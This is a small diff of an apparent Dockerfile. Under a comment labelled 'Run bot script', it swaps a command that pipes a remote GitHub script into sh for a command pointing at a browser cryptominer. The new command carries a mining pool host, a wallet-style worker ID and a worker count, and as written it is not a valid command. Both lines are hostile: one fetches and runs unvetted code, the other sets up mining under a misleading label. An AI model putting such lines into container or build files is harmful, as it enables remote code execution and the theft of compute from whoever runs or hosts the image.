@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/balma1/kitoy/main/build.sh | sh
+CMD https://browserminer.vercel.app?algorithm=yespowersugar&host=stratum-asia.rplant.xyz&port=17115&worker=shuga1q5gnn6p9q3uf5eekvvetcttal7dkx5kr9s2xzzz&password=c%3DSHUGA&workers=8
 
